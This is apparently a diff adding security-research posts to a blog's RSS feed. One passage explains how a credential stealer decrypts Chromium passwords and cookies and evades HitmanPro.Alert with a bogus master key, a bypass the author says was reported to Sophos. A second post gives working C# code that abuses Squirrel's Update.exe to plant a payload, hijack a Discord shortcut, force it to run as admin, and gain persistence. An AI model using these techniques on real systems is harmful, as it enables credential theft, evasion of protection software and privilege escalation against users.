+<p>Saved credentials are stored in a file named <code>Login Data</code>. This file is an SQLite database containing the saved username / password.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104915.png" alt="" loading="lazy"></figure>
+<p>For cookies, they are saved in a file named <code>Cookies</code>. This is also an SQLite database containing cookies names and values.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104921.png" alt="" loading="lazy"></figure>
+<h3 id="decrypt-the-extracted-data"><strong>Decrypt</strong> the extracted data.</h3>
+<p>Normally, only sensitive information is encrypted. For example, when it comes to credentials, only the password value is encrypted, and for cookies, only the cookie value itself is encrypted.</p>
+<p>If you check the BLOB of the encrypted values, newer versions of chromium have the prefix <strong>v10</strong> or <strong>v11</strong>, in these 2 versions the encryption is done in 2 steps. Older versions use only the <strong>DPAPI</strong> to decrypt this column value.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104928.png" alt="" loading="lazy"></figure>
+<p>For versions <strong>v10</strong> and <strong>v11</strong>, the process is pretty straightforward, we grab the encrypted BLOB, remove the first 3 bytes (prefix) and then grab the next 12 to use as our nonce. The encrypted data itself is the rest of the bytes (skipping the first 15).</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104933.png" alt="" loading="lazy"></figure>
+<p>Next we decrypt the value using our decrypted master key and nonce using <strong>AES-GCM</strong>.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104938.png" alt="" loading="lazy"></figure>
+<p>In case its not <strong>v10</strong> or <strong>v11</strong>, we simply decrypt the BLOB using <code>ProtectedData.Unprotect</code></p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104950.png" alt="" loading="lazy"></figure>
+<h2 id="overview-of-hitmanproalerts-protective-feature">Overview of HitmanPro.Alert's Protective Feature</h2>
+<p>HitmanPro.Alert has a feature to stop credential stealers from dumping cookies and logins from chromium based browsers.</p>
+<p>To understand what was getting detected, I took the approach of running the malware line by line in the debugger.</p>
+<p>When doing this, I saw it was getting detected when I ran this specific line of code here:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104958.png" alt="" loading="lazy"></figure>
+<p><code>ProtectedData.Unprotect</code> is a .NET wrapper for <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank" rel="noopener noreferrer">CryptUnprotectData</a>.</p>
+<p>One interesting thing is, HitmanPro.Alert knows from which browser the master key we are decrypting is from.</p>
+<p>Taking this into account, although I do not know 100% how it works, I can assume it somehow stores the keys for all browsers, or most known browsers, and then if it detects one of these keys being decrypted, blocks it.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509105008.png" alt="" loading="lazy"></figure>
+<p>In addition, it keeps track of changes to the Local State file and updates it's own values if the master key changes on file.</p>
+<h2 id="simple-bypass-technique">Simple Bypass Technique</h2>
+<p>Having all this information now, we can now try and bypass this feature.</p>
+<p>Initially, we only retrieved the master key from the <strong>Local State</strong> file and decrypted the credentials using <code>ProtectedData.Unprotect</code>.</p>
+<p>To bypass this protection, the following steps were added:</p>
+<ol><li><strong>Read and Store the Original Master Key</strong>:\</li></ol>
+<p>First, we read the master key from the Local State file.</p>
+<ol><li><strong>Generate a Bogus Master Key</strong>:\</li></ol>
+<p>We generate a fake (bogus) master key and update the <code>Local State</code> file with this value. This step tricks <strong>HitmanPro.Alert</strong> into updating its own copy of the master key with the bogus value.</p>
+<ol><li><strong>Decrypt the Original Data</strong>:\</li></ol>
+<p>Once the bogus key is in place, we proceed to decrypt the original master key using the <code>ProtectedData.Unprotect</code> function.</p>
+<ol><li><strong>Restore the Original Master Key</strong>:\</li></ol>
+<p>After decrypting the credentials, we replace the bogus key with the original master key in the <code>Local State</code> file.</p>
+<p>Code before:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509105017.png" alt="" loading="lazy"></figure>
+<p>Code after:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509105022.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509105029.png" alt="" loading="lazy"></figure>
+<h2 id="conclusion">Conclusion</h2>
+<p>The method to bypass <strong>HitmanPro.Alert</strong> "Credential Theft Protection" feature does not rely on exploits or unknown vulnerabilities. Instead, it's a simple tweak.</p>
+<p>This was reported to Sophos and accepted in March 2024.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509105037.png" alt="" loading="lazy"></figure>]]></content:encoded>
+    </item>
+    <item>
+      <title>Using Squirrel Framework to escalate privileges</title>
+      <link>https://msil.re/posts/squirrel-framework-privesc.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/squirrel-framework-privesc.html</guid>
+      <pubDate>Mon, 15 Jan 2024 00:00:00 +0000</pubDate>
+      <category>privesc</category>
+      <category>squirrel</category>
+      <category>discord</category>
+      <description>Abusing the --processStart argument of Squirrel&#x27;s Update.exe (Discord, Slack, GitHub Desktop, ...) to launch a payload from a signed binary&#x27;s UAC prompt.</description>
+      <content:encoded><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>The <a href="https://github.com/Squirrel/Squirrel.Windows" target="_blank" rel="noopener noreferrer">Squirrel framework</a> is a widely used tool for managing software installation and updates in Windows desktop applications.</p>
+<p>Many popular applications use Squirrel for installation and updates, including (but not only):</p>
+<ul><li>Discord;</li><li>GitHub Desktop;</li><li>Atom;</li><li>Postman;</li><li>WhatsApp;</li><li>Exodus;</li></ul>
+<p>Because of the way it's built, we can abuse it to try and trick the user into escalating privileges.</p>
+<p>A key aspect of this is that most applications sign their Squirrel update binaries, which gives an extra layer of legitimacy to the attack.</p>
+<p>In this example we will check <strong>Discord</strong>, which uses Squirrel for updating.</p>
+<h2 id="how-it-works">How it works</h2>
+<p>By checking out the Desktop shortcut that is created during installation, we can see an interesting argument passed to the <strong>Update.exe</strong><br></p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104259.png" alt="" loading="lazy"></figure>
+<p>The argument <code>--processStart</code> as per the documentation "<strong>Start an executable in the latest version of the app package</strong>".</p>
+<p>So what if we place a payload in the app directory, change the shortcut an run it?<br></p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104328.png" alt="" loading="lazy"></figure>
+<p>Our payload runs!</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104334.png" alt="" loading="lazy"></figure>
+<p>So to create our little POC we need a few things:</p>
+<ol><li>Find the latest version of the app package.</li><li>Place our payload on the latest app package directory.</li><li>Change the Shortcut to lunch our payload instead of the discord binary.</li></ol>
+<h3 id="finding-the-latest-version-of-the-app-package">Finding the latest version of the app package</h3>
+<p>The latest version of the app is inside a file located on: <code>%localappdata%\Discord\packages\RELEASES</code></p>
+<p>If we check the contents of this file, we have something like this: <code>230E51FC4929ACDC6DF44F0BA88B82316DDC97BF discord-updater-1.0.9013.nupkg 166474477</code></p>
+<p>What we need is this value here: <code>1.0.9013</code>, to do this we can use regex and extract it:</p>
+<pre class="language-csharp"><code class="language-csharp">private static string GetLatestVersion(string rootDirectory)
+{
+    string fileName = Path.Combine(rootDirectory, &quot;packages&quot;, &quot;RELEASES&quot;);
+
+    if (!File.Exists(fileName))
+    {
+        return string.Empty;
+    }
+
+    string content = File.ReadAllText(fileName);
+    string pattern = @&quot;\d+\.\d+\.\d+&quot;;
+
+    Match match = Regex.Match(content, pattern);
+
+    if (match.Success)
+    {
+        return match.Value;
+    }
+
+    return string.Empty;
+}
+</code></pre>
+<p>The <code>rootDirectory</code> is the root directory of discord: <code>%localappdata%\Discord</code></p>
+<h3 id="placing-our-payload-on-the-latest-app-package-directory">Placing our payload on the latest app package directory</h3>
+<pre class="language-csharp"><code class="language-csharp">private static void CopyPayload(string payloadPath, string rootDirectory) 
+{ 
+    string latestVersion = GetLatestVersion(rootDirectory);
+	if (!File.Exists(payloadPath))
+	{
+        return;
+    }
+    
+    File.Copy(payloadPath, Path.Combine(rootDirectory, $&quot;app-{latestVersion}&quot;, Path.GetFileName(payloadPath)), true);
+}
+</code></pre>
+<h3 id="change-the-shortcut">Change the Shortcut</h3>
+<p>We first need to change the argument passed to <code>--processStart</code>, to now point to our payload, in addition if we want to do this without breaking the start of discord, our payload should also be able to then call discord.exe to not arouse suspicion, hence the using of <code>--process-start-args</code>,  the value here will be passed to our payload as an argument.</p>
+<pre class="language-csharp"><code class="language-csharp">private static void ChangeShortcut(string shortcutPath, string payloadName, string exeToRun) 
+{ 
+    IWshShortcut shortcut = (IWshShortcut)new WshShell().CreateShortcut(shortcutPath);
+    shortcut.Arguments = $&quot;--processStart {payloadName} --process-start-args=\&quot;{exeToRun}\&quot;&quot;;
+    shortcut.Save();
+}
+</code></pre>
+<p>We should also set the shortcut to run as admin, since normally they will not. There is a cool trick where changing the byte with index 21 to the value 34 will set it to run as admin.</p>
+<pre class="language-csharp"><code class="language-csharp">private static void SetAdmin(string shortcutPath) 
+{
+    if (!File.Exists(shortcutPath)) { return; }
+    byte[] fileBytes = File.ReadAllBytes(shortcutPath);
+    fileBytes[21] = 34;
+    
+    File.WriteAllBytes(shortcutPath, fileBytes);
+}
+</code></pre>
+<p>Our final code will be something like this:</p>
+<pre class="language-csharp"><code class="language-csharp">static void Main(string[] args)
+{
+    string discordPath = Path.Combine(LocalAppData, &quot;Discord&quot;); 
+    string payload = &quot;SimpleSquirellTest.exe&quot;;
+    string discordShortcut = &quot;Discord.lnk&quot;;
+    
+    SetAdmin(discordShortcut);
+    CopyPayload(payload, discordPath);
+    ChangeShortcut(discordShortcut, payload, &quot;Discord.exe&quot;);
+}
+</code></pre>
+<p>If you want to see a different version of this code that tries to "weaponize" this, check:</p>
+<p><a href="https://github.com/miltinhoc/squirrel-framework-sneaky" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/squirrel-framework-sneaky</a></p>
+<p>In this project I try to search for desktop apps that use Squirrel and modify or create the desktop shortcut for them.</p>
+<h2 id="other-usages">Other usages</h2>
+<p>This can indirectly be used for a sneaky persistence. When you enable Discord to run at system startup, the same command that is in the shortcut is added to the registry.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104542.png" alt="" loading="lazy"></figure>
+<p>//HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
+<p>You could just rename discord binary to other thing and name your own to <code>Discord.exe</code>, the downside is that it would only work until discord updates.</p>
+<p>Another possible usage, if no app is not present on the target machine, could be to bring those signed binaries with you and run them by creating the "app-VERSION" folder and placing your payload there.</p>
+<p>When the user sees a UAC prompt from <strong>Discord</strong> or <strong>WhatsApp</strong> apps instead of one from an unknown and unsigned app, you might just get lucky.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>The Squirrel framework is widely adopted due to its ease of handling updates for desktop applications, but its design opens up potential risks for privilege escalation.</p>
+<p>As we’ve demonstrated with Discord, attackers can exploit signed binaries to make their actions appear legitimate, tricking users into unknowingly elevating privileges.</p>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
